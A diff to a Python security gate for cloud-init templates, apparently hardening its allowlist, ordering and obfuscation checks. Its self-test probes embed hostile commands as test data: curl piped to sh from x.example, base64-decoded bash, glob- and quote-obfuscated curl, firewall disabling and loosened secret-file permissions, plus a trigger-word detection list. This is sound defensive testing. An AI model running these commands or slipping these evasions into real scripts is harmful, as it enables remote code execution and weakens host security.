@@ -32,21 +32,25 @@ What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tp
     state and heredocs are tracked with bash rules, and a full-line ``#``
     comment is exempt ONLY outside a quote, outside a heredoc body and not
     after a continuation (the self-test proves each case).
-  * Trigger (``triggered``): a structural line, a unit line and a shebang are
-    always triggered; any other line is triggered when its text, lower-cased
-    and percent-decoded, holds a trigger word, path or metacharacter
-    (``TRIGGER_RE``). Every triggered line must match an entry
-    ``<scope> | <context> | <whitespace-normalised line>`` of the allowlist,
-    where scope is the template directory or ``both``.
-  * Allowlist form (``load_entries``): a malformed, duplicate, non-normalised
-    or unknown-scope entry is a FAULT; an entry that matches nothing is stale
+  * Trigger (``triggered``): a structural line, a unit line, a shebang, every
+    script line and every heredoc line are always triggered; a data-block line
+    is triggered when its text, lower-cased and percent-decoded, holds a
+    trigger word, path or metacharacter (``TRIGGER_RE``). Every triggered line
+    must match an entry ``<scope> | <context> | <whitespace-normalised line>``
+    of the allowlist, where scope is the template directory or ``both``.
+  * Order and count (``run_scan``): per scope and context the approved lines
+    must be the allowlist entries in file order, each as many times as it is
+    listed; a moved, repeated or reordered approved line is red.
+  * Allowlist form (``load_entries``): a malformed, non-normalised or
+    unknown-scope entry, or one listed in both files, is a FAULT; an entry that matches nothing is stale
     (a ``both`` entry must match in both templates); an empty allowlist, a
     template with zero triggered lines, or fewer than two templates is a FAULT.
     ``scripts/qc-allowlists/cloud-init-token-pending.txt`` holds lines that are
     known defects with a tracker (``<scope> #<issue> | ...``); they pass the
     allowlist but are never validated as approved, and they go stale too.
-  * Companion rule (``companion_hits``), on script blocks, data blocks and
-    bootcmd/runcmd items (YAML flow lists included): refuses ``eval``, a
+  * Companion rule (``companion_hits``), on script blocks, data blocks,
+    heredoc bodies (quoted or not), unit ``Exec*=`` commands and bootcmd/runcmd
+    items (YAML flow lists included): refuses ``eval``, a glob or a
     ``$``-expansion or command substitution in command position (also behind
     sudo/env/exec/runuser/su/nice/timeout/xargs/flock/systemd-run wrappers),
     ANSI-C or locale quoting, a shell or interpreter fed by a pipe, a
@@ -119,7 +123,9 @@ TRIGGER_WORDS = (
     "usermod groupadd runuser sudo su ln mv cp rm mkdir setfacl findmnt swapon openssl sha256sum gpg trap "
     "systemctl systemd-run bash sh dash zsh ksh base64 xxd tee dd crontab psql pg_dump pg_isready createuser "
     "sed awk mount sysctl iptables ufw ssh visudo passwd chpasswd sslmode sslrootcert password dsn dbname "
-    "conninfo serve export declare readonly local read printf mapfile function env set unset shopt ifs"
+    "conninfo serve export declare readonly local read printf mapfile function env set unset shopt ifs "
+    "if then elif else fi while until do done case esac for select exit return break continue true false nft iptables-restore ip6tables "
+    "pipx uv uvx"
 ).split()
 TRIGGER_RE = re.compile(
     r"(?<![\w-])(?:" + "|".join(re.escape(w) for w in TRIGGER_WORDS) + r"|python[\d.]*)(?![\w-])"
@@ -146,6 +152,9 @@ EXEC_RE = re.compile(r"^[ \t]*ExecStart=(?P<cmd>.*)$", re.M)
 CONT_RE = re.compile(r"\\[ \t]*\n[ \t]*")
 COMMENT_LINE_RE = re.compile(r"^[ \t]*#.*$", re.M)
 DIRECTIVE_LINE_RE = re.compile(r"^[ \t]*%\{[^}]*\}[ \t]*$", re.M)
+YAML_BREAK_RE = re.compile("[\r\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029]")
+TF_OPEN_RE = re.compile(r"^[ \t]*%\{~?[ \t]*(?:if|for)\b")
+TF_CLOSE_RE = re.compile(r"^[ \t]*%\{~?[ \t]*end(?:if|for)\b")
 
 # ---------------------------------------------------------------- validators
 # A postgres URL anywhere, but not a regex that merely begins with the scheme
@@ -265,6 +274,11 @@ def serve_invocations(text: str) -> list:
 
 def rules_1_to_4(name: str, text: str, known: set) -> list:
     hits = []
+    if not text.startswith("#cloud-config\n"):
+        hits.append("%s:1: first line is not exactly #cloud-config (cloud-init picks the handler from it)" % name)
+    for lineno, line in enumerate(text.split("\n"), 1):
+        if YAML_BREAK_RE.search(line):
+            hits.append("%s:%d: a line break other than LF (YAML splits the line the gate reads as one)" % (name, lineno))
     for lineno, line in enumerate(text.splitlines(), 1):
         if any(ord(ch) > 127 for ch in line):
             hits.append("%s:%d: non-ASCII byte (cloud-init discards the config, #1880)" % (name, lineno))
@@ -847,6 +861,9 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
             continue
         base = posixpath.basename(val)
         args = words[idx + 1:]
+        if not st.get("data") and val not in ("[", "[[") and re.search(r"[*?\[]", val):
+            out.append("command word %r is a glob (the command is chosen at run time)" % cw[:40])
+            continue
         if base == "case":
             st["case"] = st.get("case", 0) + 1
             st["pattern"] = True
@@ -1000,7 +1017,11 @@ def decode_views(text: str):
 def triggered(line: Line) -> bool:
     if line.exempt:
         return False
-    if line.kind in ("struct", "unit", "shebang"):
+    # Every executable or written line is approved from the allowlist: a
+    # vocabulary of risky words is a blocklist and misses a word it lacks
+    # (add-apt-repository, wget2, pipx), so script and heredoc lines are always
+    # triggered. The word list still decides for data blocks.
+    if line.kind in ("struct", "unit", "shebang", "script", "heredoc"):
         return True
     v1, v2 = decode_views(line.joined)
     return bool(TRIGGER_RE.search(v1) or TRIGGER_RE.search(v2))
@@ -1162,7 +1183,11 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
             while not exempt and grp[-1].rstrip().endswith("\\") and k + 1 < m:
                 k += 1
                 grp.append(ded[k])
-            lines.append(Line(path, "unit", "\n".join(grp), a + k - len(grp) + 2, a + k + 1, exempt=exempt, block=block_no))
+            uln = Line(path, "unit", "\n".join(grp), a + k - len(grp) + 2, a + k + 1, exempt=exempt, block=block_no)
+            lines.append(uln)
+            um = re.match(r"^\s*Exec\w*=[-@+!:|]*(.*)$", uln.joined, re.S)
+            if not exempt and um is not None and um.group(1).strip():
+                stmts.append(("%s:%d" % (name, uln.first), um.group(1), {}))
             k += 1
             continue
         if heredocs:
@@ -1171,7 +1196,10 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
             lines.append(Line(path, "heredoc", x, a + k + 1, a + k + 1, block=block_no))
             if chk == delim:
                 heredocs.pop(0)
-            elif not quoted:
+                k += 1
+                continue
+            stmts.append(("%s:%d" % (name, a + k + 1), x, {"data": True}))
+            if not quoted:
                 for sub in dq_subs(x):
                     if sub is None:
                         hits.append("%s:%d: unparsable substitution in a heredoc body" % (name, a + k + 1))
@@ -1181,6 +1209,7 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
             continue
         if kind == "data":
             lines.append(Line(path, "data", x, a + k + 1, a + k + 1, block=block_no))
+            st["data"] = True
             stmts.append(("%s:%d" % (name, a + k + 1), x, st))
             k += 1
             continue
@@ -1391,6 +1420,27 @@ def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
     return out
 
 
+def tf_regions(text: str) -> list:
+    """Each Terraform directive region (opener .. matching end, or a lone
+    directive line) as one whitespace-normalised text, in file order."""
+    out, cur, depth = [], [], 0
+    for raw in text.split("\n"):
+        is_dir = DIRECTIVE_LINE_RE.match(raw) is not None
+        if depth == 0 and not is_dir:
+            continue
+        cur.append(raw)
+        if is_dir and TF_OPEN_RE.match(raw):
+            depth += 1
+        elif is_dir and TF_CLOSE_RE.match(raw):
+            depth -= 1
+        if depth <= 0:
+            out.append(norm(" ".join(cur)))
+            cur, depth = [], 0
+    if cur:
+        out.append(norm(" ".join(cur)))
+    return out
+
+
 def scope_of(name: str) -> str:
     return posixpath.basename(posixpath.dirname(name))
 
@@ -1440,12 +1490,17 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
     for e in allow + pend:
         k = (e[0], e[2], e[3])
         clash = [x for x in ((k,) + tuple((sc, e[2], e[3]) for sc in SCOPES if (sc == "both") != (e[0] == "both"))) if x in seen]
-        if clash:
+        if clash and (clash[0] != k or e[1] or seen[k].startswith("pending")):
             faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], e[3][:50], seen[clash[0]]))
         seen[k] = "%s:%d" % ("pending" if e[1] else "allow", e[4])
     approved = {(e[0], e[2], e[3]) for e in allow}
     pending = {(e[0], e[2], e[3]) for e in pend}
     approved |= {(s, c, t) for s, c, t in extra}
+    expected = {}
+    for e in allow:
+        for sc in (sorted(scopes) if e[0] == "both" else [e[0]]):
+            expected.setdefault((sc, e[2]), []).append(e[3])
+    actual = {}
     used = {}
     ntrig = 0
     for nm, text in sorted(templates.items()):
@@ -1462,8 +1517,12 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
         sp = entries.get(STORE_URL_PATH)
         if sp is not None and sp.get("permissions") != "'0600'":
             hits.append("%s: %s has no permissions: '0600'" % (nm, STORE_URL_PATH))
+        for reg in tf_regions(text):
+            actual.setdefault((sc, "tf-region"), []).append(reg)
         for ln in trig:
             keys = [(sc, ln.ctx, ln.text), ("both", ln.ctx, ln.text)]
+            if not any(k in pending for k in keys):
+                actual.setdefault((sc, ln.ctx), []).append(ln.text)
             hit_a = next((k for k in keys if k in approved), None)
             hit_p = next((k for k in keys if k in pending), None)
             if hit_a is None and hit_p is None:
@@ -1478,13 +1537,21 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
             if hit_a is not None:
                 for why in validate_line(ln, homes, binaries):
                     hits.append("%s:%d: %s" % (nm, ln.first, why))
-    for e in allow + pend:
+    for e in pend:
         k = (e[0], e[2], e[3])
         need = set(scopes) if e[0] == "both" else {e[0]}
         got = used.get(k, set())
         if not need <= got:
             what = "pending" if e[1] else "allow"
             hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], e[3][:80]))
+    for key in sorted(set(expected) | set(actual)):
+        if key[0] not in scopes or autolist:
+            continue
+        want, got = expected.get(key, []), actual.get(key, [])
+        if want != got:
+            k = next((i for i, (x, y) in enumerate(zip(want, got)) if x != y), min(len(want), len(got)))
+            hits.append("%s | %s: triggered lines differ from the allowlist order at item %d (allow %d, template %d): allow=%r template=%r"
+                        % (key[0], key[1], k + 1, len(want), len(got), (want[k:k + 1] or [""])[0][:70], (got[k:k + 1] or [""])[0][:70]))
     stats = {"templates": len(templates), "allow": len(allow), "pending": len(pend), "triggered": ntrig}
     return hits, faults, stats
 
@@ -1631,7 +1698,9 @@ def build_probes() -> list:
     # ---- condition 6: trigger matching
     red("T6 case-varied trigger word", [ins(RELOAD, ["echo PoStGrEs"])], autolist=False)
     red("T6 percent-encoded trigger word", [ins(RELOAD, ["echo p%6Fstgres"])], autolist=False)
-    green("T6 untriggered plain line", [ins(RELOAD, ["echo hello"])])
+    red("T6 every script line is approved (no vocabulary)", [ins(RELOAD, ["echo hello"])], autolist=False)
+    red("T6 add-apt-repository with a neutral argument", [ins(RELOAD, ["add-apt-repository -y ppa:someone/foo"])], autolist=False)
+    red("T6 wget2 with a neutral argument", [ins(RELOAD, ["wget2 -O f example.com/x"])], autolist=False)
     red("T6 sslmode=Verify-Full", [(DSNFILE, DSNFILE.replace("verify-full", "Verify-Full"))])
     red("T6 sslmode missing", [(DSNFILE, DSNFILE.replace("sslmode=verify-full&", ""))])
     # ---- condition 2: companion rule
@@ -1651,7 +1720,93 @@ def build_probes() -> list:
     red("C2 companion in a runcmd flow list", [(RUNCMD, RUNCMD + "  - [bash, -c, \"eval $X\"]\n")])
     red("C2 companion in a runcmd string item", [(RUNCMD, RUNCMD + "  - $X -fsSL https://e\n")])
     red("C2 companion in an unquoted heredoc substitution", [ins(RELOAD, ["cat > /etc/x.conf <<EOF", "a=$(eval x)", "EOF"], before=True)])
-    green("C2 quoted heredoc body is data", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "a=$(eval x)", "EOF"], before=True)], autolist=True, core=True)
+    red("C2 quoted heredoc body is companion-checked like a data block", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "a=$(eval x)", "EOF"], before=True)])
+    red("C2 unit ExecStartPre sh -c eval", [(ENVF, ENVF + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")])
+    red("C2 glob command word", [ins(RELOAD, ["/???/???/c?rl -sSo f x.example/p"], before=True)], autolist=False)
+    red("O approved line moved after another", [(RELOAD, ""), ("      systemctl enable --now ai-memory\n", "      systemctl enable --now ai-memory\n" + RELOAD)], autolist=False)
+    red("O approved line repeated", [ins(RELOAD, ["chmod 0600 /etc/ai-memory/store-url"], before=True)], autolist=False)
+    red("O exit 0 before approved lines", [ins(RELOAD, ["exit 0"], before=True)], autolist=False)
+    red("O approved line wrapped in if false", [ins(RELOAD, ["if false; then"], before=True)], autolist=False)
+    # ---- round 3 (#4784-#4786, #4793-#4795): every probe of both reviewers is a permanent case
+    sha = ('      echo "${ai_memory_image_sha256}  $DL/ai-memory.tar.gz" | sha256sum -c - \\\n'
+           '        || { echo "ai-memory tarball digest mismatch"; rm -f "$DL/ai-memory.tar.gz"; exit 1; }\n')
+    tar_x = '      tar -xzf "$DL/ai-memory.tar.gz" --no-same-owner -C "$DL/x" ai-memory\n'
+    swap = ('        [ -z "$(swapon --show --noheadings)" ] \\\n'
+            '          || { echo "swap is active: refusing to write the CA key"; exit 1; }\n')
+    member = ('      [ -f "$DL/x/ai-memory" ] && [ ! -L "$DL/x/ai-memory" ] \\\n'
+              '        || { echo "tarball member ai-memory is not a regular file"; exit 1; }\n')
+    owner = ('      [ "$(stat -c %U /opt/ai-memory)" = aimemory ] \\\n'
+             '        || { echo "/opt/ai-memory is not owned by aimemory"; exit 1; }\n')
+    hba = '            "hostnossl all all all reject" \\\n'
+    inst = '      install -o root -g root -m 0755 "$DL/x/ai-memory" /usr/local/lib/ai-memory/bin/ai-memory\n'
+    curl_bin = '      curl -fsSL "${ai_memory_image_url}" -o "$DL/ai-memory.tar.gz"\n'
+    unit_exec = "      ExecStart=/usr/local/lib/ai-memory/bin/ai-memory serve"
+    daemon_env = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
+    dec = "      systemctl daemon-reload\n"
+    mk = "        make install PG_CONFIG=/usr/bin/pg_config\n"
+    home = "      # --- user + dirs ---\n"
+    sec = [
+        ("P1 tf %{if false} around the digest check", [(sha, "%{ if false }\n" + sha + "%{ endif }\n")]),
+        ("P2 sh if false around the digest check", [(sha, "      if false; then\n" + sha + "      fi\n")]),
+        ("P3 digest check moved after the install", [(sha, ""), (inst, inst + sha)]),
+        ("P4 lone CR turns a comment into a command", [(home, home.rstrip("\n") + "\r      chmod 0644 /etc/ai-memory/store-url\n")]),
+        ("P5 pg_conftool listen_addresses", [ins(RELOAD, ["pg_conftool 18 main set listen_addresses '*'"], before=True)]),
+        ("P6 swap check under if false", [(swap, "        if false; then\n" + swap + "        fi\n")]),
+        ("P7 header changed to a shell shebang", [("#cloud-config\n", "#!/bin/bash\n")]),
+        ("P8 jinja header before the cloud-config line", [("#cloud-config\n", "## template: jinja\n#cloud-config\n")]),
+        ("P9 cyrillic look-alike chmod", [(dec, "      \u0441hmod 0644 /etc/ai-memory/store-url\n" + dec)]),
+        ("P10 quote-split ch''mod", [(dec, "      ch''mod 0644 /etc/ai-memory/store-url\n" + dec)]),
+        ("P11 heredoc delimiter differential", [(dec, "      cat >/dev/null <<\"EOF\"x\n      EOF\n      ufw disable\n      EOFx\n" + dec)]),
+        ("P12 nft flush ruleset", [(dec, "      nft flush ruleset\n" + dec)]),
+        ("P13 member symlink check under if false", [(member, "      if false; then\n" + member + "      fi\n")]),
+        ("P14 home owner check under if false", [(owner, "      if false; then\n" + owner + "      fi\n")]),
+        ("P15 tf directive drops the hostnossl reject", [(hba, "%{ if false }\n" + hba + "%{ endif }\n")]),
+        ("P16 true before the digest check", [(sha, "      true\n" + sha)]),
+        ("P17 digest check deleted", [(sha, "")]),
+        ("P18 tar without the member name", [(tar_x, tar_x.replace(" ai-memory\n", "\n"))]),
+        ("P19 one of two identical make install lines dropped", [(mk, "")]),
+    ]
+    for lbl, muts in sec:
+        red("R3-S " + lbl, muts, autolist=False)
+    code = [
+        ("curl piped to sh", [(dec, "      curl -fsSL https://x.example/i.sh | sh\n" + dec)]),
+        ("add-apt-repository, neutral argument (#4794)", [(dec, "      add-apt-repository -y ppa:someone/foo\n" + dec)]),
+        ("apt-add-repository, neutral argument (#4794)", [(dec, "      apt-add-repository -y ppa:someone/foo\n" + dec)]),
+        ("wget2, neutral argument (#4794)", [(dec, "      wget2 -O f example.com/x\n" + dec)]),
+        ("pipx run (#4794)", [(dec, "      pipx run cowsay\n" + dec)]),
+        ("AGE_COMMIT value changed", [("      AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4\n", "      AGE_COMMIT=e43dc1a22b78fba4acef9835b2b10379b8d243b4\n")]),
+        ("store-url chmod 0640", [(CHMOD, CHMOD.replace("0600", "0640"))]),
+        ("digest check made non-fatal", [(sha, sha.replace("exit 1; }", "exit 1; } || true"))]),
+        ("runcmd folded scalar", [(RUNCMD, RUNCMD + "  - >\n    curl https://x.example/a\n")]),
+        ("runcmd plain scalar continued", [(RUNCMD, RUNCMD + "  - echo ok\n    && curl https://x.example/a\n")]),
+        ("runcmd flow list with a unicode escape hiding curl", [(RUNCMD, RUNCMD + '  - [bash, -c, "c\\u0075rl https://x.example/a"]\n')]),
+        ("c backslash newline continuation", [(dec, "      c\\\n      url -o /x https://x.example/a\n" + dec)]),
+        ("c quote u quote rl", [(dec, "      c'u'rl -o /x x.example/a\n" + dec)]),
+        ("glob command word (#4795)", [(dec, "      /???/???/c?rl -sSo f x.example/p\n" + dec)]),
+        ("regular-file check moved after the install", [(member, ""), (inst, inst + member)]),
+        ("digest check wrapped in if false", [(sha, "      if false; then\n" + sha + "      fi\n")]),
+        ("exit 0 before the binary download", [(curl_bin, "      exit 0\n" + curl_bin)]),
+        ("approved line duplicated", [(dec, "      chmod 0600 /etc/ai-memory/store-url\n" + dec)]),
+        ("shell comment inside a double-quoted multi-line string", [(dec, '      echo "a\n      # curl x\n      b"\n' + dec)]),
+    ]
+    for lbl, muts in code:
+        red("R3-C " + lbl, muts, autolist=False)
+    listed = [
+        ("serve --store_url", [(unit_exec, unit_exec + " --store_url /x")]),
+        ("serve unknown long flag --bind", [(unit_exec, unit_exec + " --bind 0.0.0.0:9077")]),
+        ("eval in a listed line", [(dec, '      eval "echo hi"\n' + dec)]),
+        ("base64 -d | bash in a listed line", [(dec, "      echo ZWNobw== | base64 -d | bash\n" + dec)]),
+        ("ANSI-C quoting in a listed line", [(dec, "      echo $'\\x41'\n" + dec)]),
+        ("variable in command position in a listed line", [(dec, '      X=curl; "$X" https://x.example\n' + dec)]),
+        ("unit ExecStartPre sh -c eval, listed (#4793)", [(daemon_env, daemon_env + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")]),
+        ("quoted heredoc with eval, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      #!/bin/sh\n      eval \"$1\"\n      EOF\n" + dec)]),
+        ("quoted heredoc with base64 -d | sh, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      echo Y3VybA== | base64 -d | sh\n      EOF\n" + dec)]),
+        ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
+    ]
+    for lbl, muts in listed:
+        red("R3-C listed " + lbl, muts, autolist=True)
+    green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
+    P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
     red("V store-url permissions '0644'", [(STORE_PERM, STORE_PERM.replace("0600", "0644"))])
     red("V store-url permissions line removed", [(STORE_PERM, "  - path: /etc/ai-memory/store-url\n")])
@@ -1704,7 +1859,7 @@ def build_probes() -> list:
     P.append(("A malformed entry", "fault", dict(allow_add="both | only-two-fields")))
     P.append(("A unknown scope", "fault", dict(allow_add="gcp | top | runcmd:")))
     P.append(("A non-normalised entry", "fault", dict(allow_add="both | top | runcmd:  x")))
-    P.append(("A duplicate entry", "fault", dict(allow_dup=True)))
+    P.append(("A duplicate entry", "red", dict(allow_dup=True)))
     P.append(("A entry in both allow and pending", "fault", dict(pend_dup=True)))
     P.append(("A malformed pending head", "fault", dict(pend_add="do-hive 4671 | top | x")))
     P.append(("A empty allowlist", "fault", dict(allow_text="# only a comment\n")))
@@ -1749,7 +1904,7 @@ def build_probes() -> list:
     dred("D-4673 tarball extracted into the binary directory", [(DTAR, "tar -xzf \"$DL/ai-memory.tar.gz\" --no-same-owner -C /usr/local/lib/ai-memory/bin\n")])
     dred("D-4675 CA key written to the persistent TLS directory", [("PGCA=/run/ai-memory-pgca\n", "PGCA=/etc/ai-memory/tls\n")])
     dred("D-4675 CA key wipe removed", [("      trap wipe_pgca EXIT\n", "")])
-    dred("D-4707 provision line de-indented below the block", [("      systemctl daemon-reload\n      # TLS is universal", "  systemctl daemon-reload\n      # TLS is universal")])
+    dred("D-4707 provision line de-indented below the block but inside it", [("      systemctl daemon-reload\n      # TLS is universal", "     systemctl daemon-reload\n      # TLS is universal")])
     P.append(("A real templates (green control)", "green", dict(autolist=False)))
     return P
 
@@ -1798,7 +1953,8 @@ def case_inputs(base: tuple, spec: dict):
 def verdict(hits: list, faults: list, spec: dict) -> str:
     if faults:
         return "fault"
-    core = [h for h in hits if "stale entry" not in h and "not in the allowlist" not in h] if spec.get("autolist") or spec.get("core") else hits
+    core = [h for h in hits if "stale entry" not in h and "not in the allowlist" not in h
+            and "not the allowlist sequence" not in h] if spec.get("autolist") or spec.get("core") else hits
     return "red" if core else "green"
 
 
@@ -1813,6 +1969,10 @@ def entry_mutations(base: tuple, cache: dict) -> list:
             continue
         sc, ctx, line = raw.split(" | ", 2)
         nm = by_scope["aws-gpu-burst" if sc == "both" else sc]
+        if ctx == "tf-region":
+            head = DIRECTIVE_LINE_RE.search(templates[nm]).group(0)
+            out.append((raw, nm, templates[nm].replace(head, "%{ if true }", 1)))
+            continue
         lines, _, _, trig, _ = analyse(nm, templates[nm], cache)
         ln = next((x for x in trig if x.ctx == ctx and x.text == line), None)
         if ln is None:
